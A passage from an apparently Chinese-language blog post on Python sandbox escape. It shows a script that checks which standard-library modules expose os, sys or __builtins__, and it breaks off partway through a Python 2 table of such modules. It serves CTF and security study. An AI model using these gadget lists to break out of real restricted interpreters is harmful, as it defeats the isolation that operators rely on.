class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search_for_os_sys_builins</span>():</span>    methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]    results = &#123;&#125;    <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> all_modules_3:        results[module] = &#123;            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-number">0</span>,            <span class="hljs-string">&#x27;result&#x27;</span>: &#123;&#125;        &#125;        <span class="hljs-keyword">try</span>:            m = <span class="hljs-built_in">__import__</span>(module)            attrs = <span class="hljs-built_in">dir</span>(m)            <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:                <span class="hljs-keyword">if</span> method <span class="hljs-keyword">in</span> attrs:                    result = <span class="hljs-string">&#x27;yes&#x27;</span>                    results[module][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span>                <span class="hljs-keyword">else</span>:                    result = <span class="hljs-string">&#x27;no&#x27;</span>                results[module][<span class="hljs-string">&#x27;result&#x27;</span>][method] = result        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-comment"># print(e)</span>            <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">return</span> results<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_result</span>(<span class="hljs-params">results</span>):</span>    <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:        <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:            print(<span class="hljs-string">&#x27;[+]&#x27;</span> + result)            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:                print(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r])<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print_result(search_for_os_sys_builins())</code></pre></div>![image-20200929220602143](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929220602143.png)可以看到默认的89个模块中只有linecache能够满足要求，其他的库都需要额外引入才行。## 0x02 python2 其他逃逸方法<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># coding=UTF-8</span>find_modules = &#123;<span class="hljs-string">&#x27;filecmp&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;heapq&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;code&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;hotshot&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;distutils&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;functools&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;random&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;tty&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;subprocess&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;sysconfig&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;whichdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;runpy&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pty&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-atheos&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xml&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sgmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;importlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserList&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;tempfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;mimify&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pprint&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;platform&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;collections&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;cProfile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;smtplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;compiler&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],                <span class="hljs-string">&#x27;string&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;SocketServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-darwin&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;zipfile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;repr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;wave&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;curses&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;antigravity&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-irix6&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-freebsd6&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-freebsd7&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-freebsd4&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-freebsd5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-freebsd8&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;aifc&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;sndhdr&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;cookielib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ConfigParser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;httplib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;bisect&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;decimal&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;cmd&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;binhex&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sunau&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;pydoc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-riscos&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;token&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;Bastion&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;msilib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;shlex&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;quopri&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;multiprocessing&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dummy_threading&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;dircache&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;asyncore&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;pkgutil&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;compileall&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;locale&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;chunk&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;macpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;popen2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;mimetypes&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;toaiff&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;atexit&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pydoc_data&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;tabnanny&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;HTMLParser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;encodings&#x27;</span>: [<span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;calendar&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;mailcap&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-unixware7&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;abc&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plistlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;bdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;py_compile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],                <span class="hljs-string">&#x27;pipes&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;rfc822&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;tarfile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;struct&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;urllib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;fpformat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;re&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>], <span class="hljs-string">&#x27;mutex&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;ntpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserString&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;new&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;formatter&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;email&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;cgi&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ftplib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-linux2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ast&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;optparse&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;UserDict&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;inspect&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;mailbox&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;Queue&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;fnmatch&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;ctypes&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;codecs&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;getopt&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;md5&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;cgitb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;commands&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;logging&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;socket&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-irix5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sre&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>],                <span class="hljs-string">&#x27;ensurepip&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;traceback&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;netrc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;wsgiref&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;plat-generic&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;weakref&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;ihooks&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;telnetlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;doctest&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pstats&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;smtpd&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_pyio&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;dis&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;os&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],                <span class="hljs-string">&#x27;pdb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;this&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;base64&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;os2emxpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;glob&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;unittest&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dummy_thread&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;fileinput&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;__future__&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],                <span class="hljs-string">&#x27;robotparser&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span 